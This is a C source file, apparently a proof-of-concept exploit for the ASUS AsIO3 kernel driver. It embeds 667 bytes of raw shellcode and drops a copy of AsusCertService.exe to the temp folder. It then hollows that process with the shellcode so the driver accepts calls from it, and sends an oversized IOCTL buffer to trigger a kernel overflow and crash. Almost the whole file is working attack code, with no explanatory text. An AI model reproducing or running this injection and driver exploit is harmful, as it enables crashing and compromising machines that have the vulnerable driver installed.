#include <windows.h>
#include <strsafe.h>
#include "AsusCertService.h"
#include "shellcode/ntos.h"

//
// 32 bit shellcode for 32 bit AsusCertService.exe
//
static unsigned char ShellCode[667] = {
    0x55, 0x8B, 0xEC, 0x83, 0xE4, 0xF8, 0x81, 0xEC, 0x8C, 0x00, 0x00, 0x00, 0x64, 0xA1, 0x18, 0x00,
    0x00, 0x00, 0x53, 0x56, 0x57, 0x8B, 0x40, 0x30, 0x83, 0x64, 0x24, 0x18, 0x00, 0x6A, 0x5C, 0x5A,
    0x8B, 0x40, 0x0C, 0x6A, 0x44, 0x8B, 0x40, 0x0C, 0x8B, 0x00, 0x8B, 0x70, 0x18, 0x58, 0x6A, 0x65,
    0x59, 0x6A, 0x76, 0x66, 0x89, 0x44, 0x24, 0x32, 0x58, 0x6A, 0x69, 0x5F, 0x6A, 0x63, 0x66, 0x89,
    0x44, 0x24, 0x36, 0x58, 0x6A, 0x41, 0x66, 0x89, 0x44, 0x24, 0x3A, 0x58, 0x6A, 0x73, 0x66, 0x89,
    0x4C, 0x24, 0x34, 0x66, 0x89, 0x4C, 0x24, 0x3C, 0x59, 0x6A, 0x75, 0x66, 0x89, 0x44, 0x24, 0x40,
    0x58, 0x6A, 0x67, 0x66, 0x89, 0x44, 0x24, 0x44, 0x58, 0x6A, 0x6F, 0x66, 0x89, 0x44, 0x24, 0x48,
    0x58, 0x66, 0x89, 0x44, 0x24, 0x48, 0x6A, 0x33, 0x58, 0x66, 0x89, 0x44, 0x24, 0x4A, 0x33, 0xC0,
    0x66, 0x89, 0x54, 0x24, 0x2C, 0x66, 0x89, 0x54, 0x24, 0x3A, 0xBA, 0x8E, 0x2E, 0x4C, 0xC2, 0x66,
    0x89, 0x4C, 0x24, 0x3E, 0x66, 0x89, 0x4C, 0x24, 0x42, 0x8B, 0xCE, 0x66, 0x89, 0x7C, 0x24, 0x34,
    0x66, 0x89, 0x7C, 0x24, 0x46, 0x66, 0x89, 0x44, 0x24, 0x4C, 0xE8, 0x70, 0x01, 0x00, 0x00, 0xBA,
    0x4A, 0xBC, 0xE2, 0x71, 0x89, 0x44, 0x24, 0x1C, 0x8B, 0xCE, 0xE8, 0x60, 0x01, 0x00, 0x00, 0x8B,
    0xF8, 0xBA, 0x3E, 0x67, 0x51, 0xCD, 0x8B, 0xCE, 0x89, 0x7C, 0x24, 0x50, 0xE8, 0x4E, 0x01, 0x00,
    0x00, 0xBA, 0x0A, 0xD8, 0xCC, 0x47, 0x89, 0x44, 0x24, 0x10, 0x8B, 0xCE, 0xE8, 0x3E, 0x01, 0x00,
    0x00, 0xBA, 0xE5, 0x18, 0x77, 0x54, 0x8B, 0xCE, 0x8B, 0xD8, 0xE8, 0x30, 0x01, 0x00, 0x00, 0x83,
    0x7C, 0x24, 0x1C, 0x00, 0x8B, 0xF0, 0x0F, 0x84, 0x1B, 0x01, 0x00, 0x00, 0x85, 0xFF, 0x0F, 0x84,
    0x13, 0x01, 0x00, 0x00, 0x83, 0x7C, 0x24, 0x10, 0x00, 0x0F, 0x84, 0x08, 0x01, 0x00, 0x00, 0x85,
    0xDB, 0x0F, 0x84, 0x00, 0x01, 0x00, 0x00, 0x85, 0xF6, 0x0F, 0x84, 0xF8, 0x00, 0x00, 0x00, 0x6A,
    0x18, 0x59, 0x32, 0xC0, 0x8D, 0xBC, 0x24, 0x80, 0x00, 0x00, 0x00, 0xF3, 0xAA, 0x8D, 0x44, 0x24,
    0x14, 0x33, 0xFF, 0x50, 0x6A, 0x18, 0x8D, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x50, 0x57, 0x6A,
    0xFF, 0xFF, 0xD3, 0x85, 0xC0, 0x0F, 0x88, 0xB5, 0x00, 0x00, 0x00, 0x8B, 0x84, 0x24, 0x94, 0x00,
    0x00, 0x00, 0x89, 0x44, 0x24, 0x54, 0x8D, 0x44, 0x24, 0x2C, 0x50, 0x8D, 0x44, 0x24, 0x74, 0x50,
    0xFF, 0x54, 0x24, 0x18, 0x57, 0x57, 0x57, 0x6A, 0x01, 0x57, 0x57, 0x8D, 0x84, 0x24, 0x88, 0x00,
    0x00, 0x00, 0xC7, 0x44, 0x24, 0x70, 0x18, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x78, 0x8D, 0x84,
    0x24, 0x90, 0x00, 0x00, 0x00, 0x57, 0x50, 0x8D, 0x44, 0x24, 0x78, 0x89, 0x7C, 0x24, 0x7C, 0x50,
    0x68, 0x00, 0x00, 0x00, 0xC0, 0x8D, 0x44, 0x24, 0x40, 0xC7, 0x84, 0x24, 0x8C, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x50, 0x89, 0xBC, 0x24, 0x94, 0x00, 0x00, 0x00, 0x89, 0xBC, 0x24, 0x98,
    0x00, 0x00, 0x00, 0xFF, 0x54, 0x24, 0x7C, 0x85, 0xC0, 0x78, 0x45, 0x6A, 0x04, 0x8D, 0x44, 0x24,
    0x18, 0x89, 0x7C, 0x24, 0x18, 0x50, 0x6A, 0x04, 0x8D, 0x44, 0x24, 0x60, 0x50, 0x68, 0x90, 0xA4,
    0x40, 0xA0, 0x8D, 0x84, 0x24, 0x8C, 0x00, 0x00, 0x00, 0x50, 0x57, 0x57, 0x57, 0xFF, 0x74, 0x24,
    0x3C, 0xFF, 0x54, 0x24, 0x44, 0x85, 0xC0, 0x78, 0x17, 0x83, 0x4C, 0x24, 0x24, 0xFF, 0xC7, 0x44,
    0x24, 0x20, 0x80, 0x3C, 0x36, 0xFE, 0x8D, 0x44, 0x24, 0x20, 0x50, 0x57, 0xFF, 0xD6, 0xEB, 0xF6,
    0x83, 0x4C, 0x24, 0x24, 0xFF, 0xC7, 0x44, 0x24, 0x20, 0x80, 0x3C, 0x36, 0xFE, 0x8D, 0x44, 0x24,
    0x20, 0x50, 0x57, 0xFF, 0xD6, 0xEB, 0xF6, 0xCC, 0x5F, 0x5E, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3, 0x55,
    0x8B, 0xEC, 0x83, 0xEC, 0x14, 0x53, 0x57, 0x8B, 0xF9, 0x89, 0x55, 0xFC, 0x8B, 0x47, 0x3C, 0x8B,
    0x44, 0x38, 0x78, 0x03, 0xC7, 0x8B, 0x48, 0x1C, 0x8B, 0x58, 0x20, 0x03, 0xCF, 0x89, 0x4D, 0xEC,
    0x03, 0xDF, 0x8B, 0x48, 0x24, 0x8B, 0x40, 0x18, 0x03, 0xCF, 0x89, 0x4D, 0xF0, 0x33, 0xC9, 0x89,
    0x5D, 0xF4, 0x8B, 0xD1, 0x89, 0x45, 0xF8, 0x85, 0xC0, 0x74, 0x3A, 0x56, 0x8B, 0x34, 0x93, 0x8B,
    0xD9, 0x03, 0xF7, 0xEB, 0x0A, 0x0F, 0xBE, 0xC0, 0x33, 0xD8, 0xC1, 0xC3, 0x03, 0x43, 0x46, 0x8A,
    0x06, 0x84, 0xC0, 0x75, 0xF0, 0x3B, 0x5D, 0xFC, 0x74, 0x0B, 0x8B, 0x5D, 0xF4, 0x42, 0x3B, 0x55,
    0xF8, 0x72, 0xD9, 0xEB, 0x0F, 0x8B, 0x45, 0xF0, 0x8B, 0x4D, 0xEC, 0x0F, 0xB7, 0x04, 0x50, 0x8B,
    0x0C, 0x81, 0x03, 0xCF, 0x5E, 0x5F, 0x8B, 0xC1, 0x5B, 0xC9, 0xC3
};

BOOL supWriteBufferToFile(
    _In_ LPWSTR lpFileName,
    _In_ PVOID Buffer,
    _In_ DWORD BufferSize
)
{
    HANDLE hFile;
    DWORD bytesIO;

    hFile = CreateFile(lpFileName,
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    WriteFile(hFile, Buffer, BufferSize, &bytesIO, NULL);
    CloseHandle(hFile);

    return (bytesIO == BufferSize);
}

#define WIN32_ERROR_WITH_BREAK(Func) { printf_s("[!] %s fail %lX\n", Func, GetLastError()); break; }
#define NATIVE_ERROR_WITH_BREAK(Func, Status) { printf_s("[!] %s fail %lX\n", Func, Status); break; }

BOOL InjectPayload(
    _In_ PVOID pvTargetImage,
    _In_ LPWSTR lpTargetModule,
    _Out_ PHANDLE phZombieProcess
)
{
    BOOL						bResult = FALSE;
    NTSTATUS					ntStatus;
    ULONG						offset, returnLength = 0;
    HANDLE						sectionHandle = NULL;

    PIMAGE_DOS_HEADER			dosHeader;
    PIMAGE_FILE_HEADER			fileHeader;
    PIMAGE_OPTIONAL_HEADER		optHeader;

    LPVOID						pvImageBase = NULL, pvLocalBase;
    SIZE_T						viewSize, readBytes = 0;
    LARGE_INTEGER				secMaxSize;

    PROCESS_BASIC_INFORMATION	processBasicInfo;
    PROCESS_INFORMATION			processInfo;
    STARTUPINFO					startupInfo;

    do {

        *phZombieProcess = NULL;

        RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
        startupInfo.cb = sizeof(startupInfo);

        processInfo.hProcess = NULL;
        processInfo.hThread = NULL;

        dosHeader = (PIMAGE_DOS_HEADER)pvTargetImage;
        fileHeader = (PIMAGE_FILE_HEADER)((PBYTE)dosHeader + sizeof(DWORD) + dosHeader->e_lfanew);
        optHeader = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileHeader + sizeof(IMAGE_FILE_HEADER));
        secMaxSize.QuadPart = optHeader->SizeOfImage;

        if (fileHeader->Machine != IMAGE_FILE_MACHINE_I386 &&
            fileHeader->Machine != IMAGE_FILE_MACHINE_AMD64)
        {
            printf_s("Unsupported type\n");
            break;
        }

        ntStatus = NtCreateSection(&sectionHandle,
            SECTION_ALL_ACCESS,
            NULL,
            &secMaxSize,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            NULL);

        if (!NT_SUCCESS(ntStatus)) {
            NATIVE_ERROR_WITH_BREAK("NtCreateSection", ntStatus);
        }

        SetLastError(0);

        if (!CreateProcess(NULL,
            lpTargetModule,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED | NORMAL_PRIORITY_CLASS,
            NULL,
            NULL,
            &startupInfo,
            &processInfo))
        {
            WIN32_ERROR_WITH_BREAK("CreateProcess");
        }

        ntStatus = NtQueryInformationProcess(processInfo.hProcess,
            ProcessBasicInformation,
            &processBasicInfo,
            sizeof(PROCESS_BASIC_INFORMATION),
            &returnLength);

        if (!NT_SUCCESS(ntStatus)) {
            NATIVE_ERROR_WITH_BREAK("NtQueryInformationProcess", ntStatus);
        }

        offset = FIELD_OFFSET(PEB, ImageBaseAddress);

        if (!ReadProcessMemory(processInfo.hProcess,
            RtlOffsetToPointer(processBasicInfo.PebBaseAddress, offset),
            &pvImageBase,
            sizeof(PVOID),
            &readBytes))
        {
            WIN32_ERROR_WITH_BREAK("ReadProcessMemory");
        }

        viewSize = optHeader->SizeOfImage;
        pvLocalBase = NULL;

        ntStatus = NtMapViewOfSection(sectionHandle,
            NtCurrentProcess(),
            &pvLocalBase,
            0,
            optHeader->SizeOfImage,
            NULL,
            &viewSize,
            ViewUnmap,
            0,
            PAGE_EXECUTE_READWRITE);

        if (!NT_SUCCESS(ntStatus)) {
            NATIVE_ERROR_WITH_BREAK("NtMapViewOfSection", ntStatus);
        }

        if (!ReadProcessMemory(processInfo.hProcess,
            pvImageBase,
            pvLocalBase,
            optHeader->SizeOfImage,
            &readBytes))
        {
            WIN32_ERROR_WITH_BREAK("ReadProcessMemory");
        }

        ntStatus = NtUnmapViewOfSection(processInfo.hProcess, pvImageBase);

        if (!NT_SUCCESS(ntStatus)) {
            NATIVE_ERROR_WITH_BREAK("NtUnmapViewOfSection", ntStatus);
        }

        viewSize = optHeader->SizeOfImage;

        ntStatus = NtMapViewOfSection(sectionHandle,
            processInfo.hProcess,
            &pvImageBase,
            0,
            optHeader->SizeOfImage,
            NULL,
            &viewSize,
            ViewShare,
            0,
            PAGE_EXECUTE_READWRITE);

        if (!NT_SUCCESS(ntStatus)) {
            NATIVE_ERROR_WITH_BREAK("NtMapViewOfSection", ntStatus);
        }

        RtlCopyMemory(RtlOffsetToPointer(pvLocalBase, optHeader->AddressOfEntryPoint),
            ShellCode,
            sizeof(ShellCode));

        ResumeThread(processInfo.hThread);
        bResult = TRUE;

        *phZombieProcess = processInfo.hProcess;

    } while (FALSE);

    if (bResult == FALSE) {

        if (processInfo.hProcess != NULL)
            CloseHandle(processInfo.hProcess);

    }

    if (sectionHandle != NULL)
        NtClose(sectionHandle);

    if (processInfo.hThread != NULL)
        CloseHandle(processInfo.hThread);

    return bResult;
}

NTSTATUS CallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    IO_STATUS_BLOCK ioStatus;

    return NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

}

HANDLE OpenAsIoDevice()
{
    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\Asusgio3"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {

        printf_s("[!] AsIO3 device open error: %lX\n", GetLastError());
    }

    return deviceHandle;
}

VOID TriggerBufferOverflow(
    _In_ HANDLE DeviceHandle
)
{
    UCHAR dBuffer[100];

    printf_s("[+] Hit any key to BSOD\r\n");
    system("pause");

    RtlFillMemory(dBuffer, sizeof(dBuffer), 0xFF);

    NTSTATUS ntStatus = CallDriver(DeviceHandle,
        0xA0402450,
        &dBuffer,
        sizeof(dBuffer),
        &dBuffer,
        sizeof(dBuffer));

    printf_s("[+] CallDriver %lX\n", ntStatus);
}

int main()
{
    WCHAR szBuffer[MAX_PATH * 2];
    DWORD cch;
    HANDLE hDevice, hZombie = NULL;

    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));

    printf_s("[+] Initial attempt to open AsIO3 driver device\n");
    hDevice = OpenAsIoDevice();

    if (hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(hDevice);
        return 0;
    }

    cch = ExpandEnvironmentStrings(L"%temp%\\AsusCertService.exe", szBuffer, MAX_PATH);
    if (cch == 0 || cch > MAX_PATH) {
        printf_s("[!] ExpandEnvironmentStrings unexpected return\n");
    }
    else {

        if (!supWriteBufferToFile(szBuffer,
            AsusCertServiceData,
            sizeof(AsusCertServiceData)))
        {
            printf_s("[!] Unexpected write to file return\n");
        }
        else {

            if (InjectPayload(AsusCertServiceData, szBuffer, &hZombie)) {

                printf_s("[+] Payload injected\n");

                for (int i = 5; i; i--) {
                    Sleep(1000);
                    printf_s("[~] Waiting for %d sec\n", i);
                }

                hDevice = OpenAsIoDevice();
                if (hDevice != INVALID_HANDLE_VALUE) {

                    TriggerBufferOverflow(hDevice);
                    //never here.
                    CloseHandle(hDevice);
                }
                TerminateProcess(hZombie, 0);
                CloseHandle(hZombie);
            }
            else {
                printf_s("[!] Error injecting payload\n");
            }
        }
    }

    return 0;
}
